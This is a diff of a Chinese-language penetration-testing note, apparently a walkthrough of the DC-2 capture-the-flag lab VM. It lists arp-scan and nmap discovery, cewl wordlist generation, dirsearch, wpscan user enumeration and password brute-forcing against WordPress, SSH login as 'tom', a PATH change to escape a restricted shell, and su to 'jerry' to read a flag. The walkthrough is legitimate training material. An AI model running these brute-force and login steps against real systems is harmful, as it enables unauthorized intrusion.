@@ -1,5 +1,5 @@
 ### 扫描地址
-```
+```zsh
 ┌──(kali㉿kali)-[~]
 └─$ sudo arp-scan -l
 [sudo] password for kali:
@@ -15,7 +15,7 @@ Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
 
 ### 得到地址后
 
-```
+```zsh
 ┌──(kali㉿kali)-[~]
 └─$ nmap 192.168.7.129 -p 1-65535
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-05 09:19 EDT
@@ -36,13 +36,13 @@ MAC Address: 00:0C:29:9E:63:89 (VMware)
 
 [[cewl]]是一个字典生成器，它从指定url读取字符串
 
-```
+```zsh
 cewl http://dc-2/ >> 11.txt
 ```
 
 ### [[dirsearch]]
 
-```
+```zsh
 dirsearch -u http://dc-2/
 dirsearch -u 192.168.7.129
 ```
@@ -53,7 +53,7 @@ dirsearch -u 192.168.7.129
 
 ### 枚举用户
 
-```
+```zsh
 wpscan --url http://dc-2/ -e u
 ```
 
@@ -67,7 +67,7 @@ tom
 
 ### 与[[cewl]]得到的字典组合
 
-```
+```zsh
 wpscan --url http://dc-2/ -U user.txt -P 11.txt
 ```
 
@@ -85,19 +85,19 @@ http://dc-2/wp-admin
 
 ### 使用ssh登录tom
 
-```
+```zsh
 ssh tom@192.168.7.129 -p 7744
 ```
 
 ### 添加PATH使用更多命令
 
-```
+```zsh
 export PATH=/bin:$PATH
 ```
 
 ### 由此查看flag3
 
-```
+```zsh
 tom@DC-2:~$ su jerry
 jerry@DC-2:~$ ls
 flag4.txt
@@ -105,7 +105,7 @@ flag4.txt
 
 ### 得到flag4
 
-```
+```zsh
 jerry@DC-2:~$ cat flag4.txt
 Good to see that you've made it this far - but you're not home yet.
 
